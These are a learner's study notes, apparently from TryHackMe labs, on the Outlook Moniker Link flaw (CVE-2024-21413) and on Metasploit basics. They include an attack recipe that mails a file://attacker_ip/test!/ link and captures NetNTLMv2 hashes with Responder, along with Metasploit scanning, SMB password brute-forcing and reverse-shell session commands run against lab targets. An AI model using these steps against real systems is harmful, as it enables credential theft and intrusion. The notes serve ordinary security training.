# Moniker Link (CVE-2024-21413)

- Outlook is Microsoft’s email client. If you receive an email with a file:// link to a remote share, Outlook normally blocks automatic access with Protected View. But if the link contains an exclamation mark e.g., [file://attacker/test!x], Outlook may still cause your PC to contact the remote host — your machine “knocks” and sends an NTLMv2 authentication hash even if the file doesn’t exist. That hash can be captured and abused by an attacker.

- A moniker link is a special kind of Windows identifier (a “name”) that tells Windows to look up and instantiate a Component Object Model (COM) object or resource — sometimes using a string that looks like a URL  --> example  [file://attacker/test!x]

- MIME stands for Multipurpose Internet Mail Extensions.

- Its like envelope , all html , attachments like images and links can be carried in this MIME

## EXPLOITATION 

- For exploiting this , i created a mail with  [file://attacker_ip/test!/] and after this i send it to victim

- Then i enabled `responder -I ens5 ` which listen on SMB where -I is interface

- Then run the exploit -->  ` python3 exploit.py ` 

- Finally a mail will be sent to victim and whem he click it , we can listen / capture his hash ie netNTLMv2

## DETECTION 

- YARA is created to detect moniker links --> file ://

- On WIRESHARK we can see SMB request sent by the attacker to client !  

## REMEDIATION

- Altho microsoft has fixed this issue, its still a reminder for us to not click the unknown links and be safe !

----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# INTRODUCTION TO METASPLOITABLE 


## INTRODUCTION 

- Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation ETC.

- msfconsole: The main command-line interface.
-  Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack
- Tools: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing

- Exploit: A piece of code that uses a vulnerability present on the target system.
- Vulnerability: A design, coding, or logic flaw affecting the target system. 
- Payload: An exploit will take advantage of a vulnerability

## Main component of metasploit 

- To launch it , we can use the command --> ` msfconsole `

### TYPES OF MODULES

- Auxilliary --> They are helpers , used for non exploit task like scanning etc

- Encoders --> Allow's you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them 

- Evasion --> This is also a technique used to prevent payload from getting detected 

- Exploits --> Target-specific code that attempts to take advantage of a vulnerability.

- Nop --> Stands for No Operation , meaning do nothing , this makes sure anything is not done for one cpu cycle --> To achieve consisten payload size

- Payloads --> Codes tsht will run on the target system

- Post --> These are  useful on the final stage of the penetration testing process listed above, post-exploitation.



- DIRECTORIES UNDER PAYLOADS
    - SINGLE --> All code is sent at once immidiatelt
    - STAGERS --> A small piece of code is sent at the start rather than entire code to establist connection and reliability
    - STAGES --> Sending big part of codes after Staging
    - ADAPTERS --> Wraping payloads to convert them into different formats


## MSF CONSOLE

- Syntaxex used iN MSFCONSOLE

- It uses same command as that of linux 

- To launch it we use -> ` msfconsole `

- List the item --> ` ls `

- To get help / information --> ` help module_name `

- To see the command u types --> ` history `

- To use an exploit --> ` use exploit_name `

- to get options regarding the exploit of what all requirement need to be met or set for the payload to functionn --> ` use payload ` --> ` show options ` --> ` set option_name ` 

- Information on any module can be found using --> ` info `

- Search is most imp command , because it is used to find the payload or auxiliary based on name or cv  number --> ` search payload_name ` or  `search ms17-010` or  ` search type:auxiliary telnet `

### SHOW OPTION command will give u a parametre list :

- RHOSTS: “Remote host”, the IP address of the target system.
- RPORT: “Remote port”, the port on the target system the vulnerable application is running on.
- PAYLOAD: The payload you will use with the exploit.
- LHOST: “Localhost”, the attacking machine IPaddress
- LPORT: “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine
- SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.

- You can set these values using --> ` set param_value ` or unset it using --> ` unset param_value `

- You can use the setg command to set values that will be used for all modules. The setg command is used like the set command. The difference is that if you use the set command to set a value using a module and you switch to another module, you will need to set the value again. The setg command allows you to set the value so it can be used by default across different modules. You can clear any value set with setg using unsetg.

- Once everythin is set  u can run the payload either using ` exploit ` command or using ` run ` command 

- The ` exploit -z ` command will run the exploit and background the session as soon as it opens

- Some moudles have ` check ` command or option which will check is target is vulnerable !

- `background` --> This  background's the session prompt and go back to the msfconsole prompt.

- ` sessions ` command is used to see all the sessions running and to interact with any of the sessions use ` sessions -i session_number `

----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# METASPLOIT : EXPLOITATION

----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# SCANNING 

- Meta has lot of tools for scanning open ports , in order to search for tools ,u can use cmd ` search portscan `

- Port scanning modules will require you to set a few options:
   - CONCURRENCY: Number of targets to be scanned simultaneously.
   - PORTS: Port range to be scanned. For nmap , its top 1000 ports whereas in meta its from 1 to 10000.
   - RHOSTS: Target or target network to be scanned.
   - THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.

- You can use NMAP for faster scanning , on meta itself --> ` msf6 > nmap -sS 10.10.12.229 `

- The [scanner/discovery/udp_sweep]  module will allow you to quickly identify services running over the UDP (User Datagram Protocol)  --> ` use scanner/discovery/udp_sweep ` --> ` run ` .

- SMB Scans are also provided , ie specific service related scans -->   auxiliary modules --> smb_version , smb_enumshares

-  NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers

Q ) How many ports are open in target system ?
--> I solved this using both nmap and metasploitable :

## Using METASPLOITABLE
- I initially started meta --> ` msfconsole `
- Then , i searched for port scanner using ` search portscan `
- Then , i got few auxiliary , i chose the one which will give me all tcp ports open --> ` use module_name `
- Then finally i did show options , it gave me a number of options , and i ser RHOST to the target ip_address.
- Then i used ` run ` , and got my answer --> 5 open ports

## USING NMAP
- Its easy using nmap 
- ` nmap -sS Target_ip `
- We get the solution 

Q ) Using the relevant scanner, what NetBIOS name can you see?
- Go to meta --> ` search NETBIOS ` --> Choose releveant module --> ` use module_name ` --> ` show options ` --> set the required field --> ` run ` --> solution is  ACME IT SUPPORT

Q ) What is running on port 8000?
- We know , for port 8000 mostly http runs
- ` search http_version `
- ` use module_name `
- ` show options `
- ` Set RPORT 8000` , ` set RHOST target_ip `
- ` run `
- solution --> webfs/1.21


 Q ) What is the "penny" user's SMB password? 
- For this , since we know we are using SMB and wanna find smb password
- i searched for ` search smb_verision `
- ` use module_name `
-  ` show options `
- i set the RHOST , user_name as " penny " and password_list as mentioned in the question 
- `run`
- soltuon is leo1234


# The metasploit database 

- So when u are having a single target , the db is not required . But in case of pentester , we need it , because its important ,to have a db when we have multtiple targets

- You will first need to start the PostgreSQL database, which Metasploit will use with the following command: `systemctl start postgresql`.
- To initialize db we use --> ` sudo -u postgres msfdb init. `
- To delete the existing db -->  `sudo -u postgres msfdb delete`.
- You can now launch `msfconsole` and check the database status using the `db_status` command.
- You can list available workspaces using the `workspace` command.
- You can add a workspace using the -a parameter or delete a workspace using the -d parameter, respectively
    - `workspace -a tryhackme`

- You can navigate between workspaces using command ` workspace workspace_name `
- ` workspace -h ` to list available workspace
- If you run a Nmap scan using the db_nmap shown below, all results will be saved to the database.
    -  ` db_nmap -sV -p- 10.10.12.229 `
- The `hosts -h` and `services -h` commands can help you become more familiar with available options.

- HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).
- FTP: Could allow anonymous login and provide access to interesting files.
- SMB: Could be vulnerable to SMB exploits like MS17-010
- SSH: Could have default or easy to guess credentials
- RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 



# VULNERABILITY SCANNING 
# ----------------------

- Metasploit allows you to quickly identify some critical vulnerabilities that could be considered as “low hanging fruit”.  

- The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.

- Finding vulnerabilities, depends on your skills on finding information about the target .


# EXPLOITATION
# ------------

- Metasploit is an exploitation framework

- Most of the exploits will have a preset default payload. However, you can always use the `show payloads` command to list other commands you can use with that specific exploit.

- ` set payload ` sets ur payload.
- a reverse payload will at least require you to set the LHOST option.

- Once a session is opened, you can background it using CTRL+Z or abort it using CTRL+C.
- The `sessions` command will list all active sessions. 
- To interact with any session , se can use the command ` session -i session_id `